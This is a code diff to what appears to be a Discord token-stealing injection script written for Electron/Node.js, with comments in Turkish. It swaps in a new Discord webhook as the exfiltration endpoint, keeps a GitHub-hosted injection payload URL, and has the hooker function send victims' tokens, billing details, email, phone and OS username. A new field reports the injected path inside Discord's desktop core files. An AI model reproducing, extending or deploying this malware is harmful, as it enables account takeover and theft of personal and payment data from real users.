@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1429432134304661544/ghcYkngo4NJvQqTNTF7D-ibTZMryVJARqdvlNMKMUIzJmbNFUkByo7p_tpcZIsdztJaW",
+    webhook: "https://discord.com/api/webhooks/1429220016682959040/GSURELbnEyx7MJ7OQHDbmhro6HL7W63wn45mwXMPDyRsp3P2MgN0WJ6BHOezPNbPx4Fl",
     injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/injectionn.js",
     filters: {
         urls: [
@@ -168,12 +168,15 @@ const hooker = async (content, token, account) => {
     const friends = await getFriends(token);
     const servers = await getServers(token);
 
-    // Ana embed'i index.js'deki gibi yap
+    // Ana embed'i güncelle - orijinal field'ları koru ve ek bilgiler ekle
     content["embeds"][0]["footer"] = { 
         text: `${os.userInfo().username} | https://t.me/hairo13x7`, 
         icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" 
     };
-    content["embeds"][0]["fields"] = [
+    
+    // Orijinal field'ları koru ve ek bilgiler ekle
+    const originalFields = content["embeds"][0]["fields"] || [];
+    const additionalFields = [
         { name: `<:mastercard_spacex:1429086506781511771> Token:`, value: `\`\`\`${token}\`\`\``, inline: false },
         { name: `<:badges_spacex:1429086523906850906> Badges:`, value: badges || "`No Badges`", inline: true },
         { name: `<:mastercard_spacex:1429086506781511771> Billing:`, value: billing, inline: true },
@@ -181,6 +184,12 @@ const hooker = async (content, token, account) => {
         { name: `<:email_spacex:1429086532811358350> Email:`, value: `\`${account.email}\``, inline: true },
         { name: `<a:billing_postal:1429086529300598895> Phone:`, value: `\`${account.phone || "None"}\``, inline: true },
     ];
+    
+    // Injection path'i ekle
+    const injectionPath = `C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+    additionalFields.push({ name: `<:space_classic:1429086519901032610> Path:`, value: `\`${injectionPath}\``, inline: false });
+    
+    content["embeds"][0]["fields"] = [...originalFields, ...additionalFields];
     content["embeds"][0]["color"] = 0x313338;
     content["embeds"][0]["author"] = { name: account.username, icon_url: avatarUrl };
     content["embeds"][0]["thumbnail"] = { url: avatarUrl };
